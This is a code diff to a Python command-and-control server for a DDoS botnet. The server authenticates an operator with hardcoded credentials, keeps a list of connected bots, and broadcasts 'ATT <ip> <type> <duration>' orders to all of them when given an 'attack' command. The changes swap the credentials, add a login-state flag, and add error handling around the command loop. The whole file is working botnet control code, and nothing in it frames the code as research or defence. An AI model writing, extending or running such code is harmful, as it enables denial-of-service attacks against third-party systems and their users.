@@ -11,10 +11,12 @@ CNC_PORT = 5002
 CNC_PORT_TO_ATTACKER = 5003
 
 
-ATTACKER_USER = "admin"
-ATTACKER_PASS = "admin"
+ATTACKER_USER = "dead"
+ATTACKER_PASS = "beef"
 
 bots = []
+
+access_user_verify = False
 
 # BOt handle
 def handle_bot(conn, addr):
@@ -65,44 +67,51 @@ def handle_attacker(conn):
         return
 
     conn.send(b"CNC access granted\n")
+    access_user_verify = True
 
     while True:
-        conn.send(b"> ")
-        cmd = conn.recv(1024).decode().strip()
+        try: 
+            conn.send(b"> ")
+            cmd = conn.recv(1024).decode().strip()
 
-        if cmd == "list":
-            conn.send(f"Bots: {len(bots)}\n".encode())
+            if cmd == "list":
+                conn.send(f"Bots: {len(bots)}\n".encode())
 
-        elif cmd.startswith("attack"):
-            parts = cmd.split()
-            if len(parts) < 2:
-                conn.send(b"Usage: attack <ip>\n")
-                continue
+            elif cmd.startswith("attack"):
+                parts = cmd.split()
+                if len(parts) < 2:
+                    conn.send(b"Usage: attack <ip>\n")
+                    continue
 
-            target = parts[1]
-            type_att = 1
-            duration = 10
-            print(target, type_att, duration)
+                target = parts[1]
+                type_att = 1
+                duration = 10
+                print(target, type_att, duration)
 
-            if len(parts) == 3:
-                type_att= parts[2]
-            elif len(parts) == 4:
-                type_att=parts[2]
-                duration = parts[3]
+                if len(parts) == 3:
+                    type_att= parts[2]
+                elif len(parts) == 4:
+                    type_att=parts[2]
+                    duration = parts[3]
 
-            for bot in bots:
-                try:
-                    bot.sendall(f"ATT {target} {type_att} {duration}\n".encode())
-                    print(f"ATT {target} {type_att} {duration}\n")
-                    #bot.send(f"ATT {target} {att_type} {duration}\n".encode())
-                except Exception as e:
-                    print(f"Sending error: {e}")
+                for bot in bots:
+                    try:
+                        bot.sendall(f"ATT {target} {type_att} {duration}\n".encode())
+                        print(f"ATT {target} {type_att} {duration}\n")
+                        #bot.send(f"ATT {target} {att_type} {duration}\n".encode())
+                    except Exception as e:
+                        print(f"Sending error: {e}")
 
-            conn.send(b"Attack sent\n")
+                conn.send(b"Attack sent\n")
 
-        elif cmd == "exit":
-            break
+            elif cmd == "exit":
+                break
 
+        except BrokenPipeError:
+            if access_user_verify:
+                print("Closed connection with ddos attacker")
+                access_user_verify=False
+                break
     conn.close()
 
 def start_attacker_server():
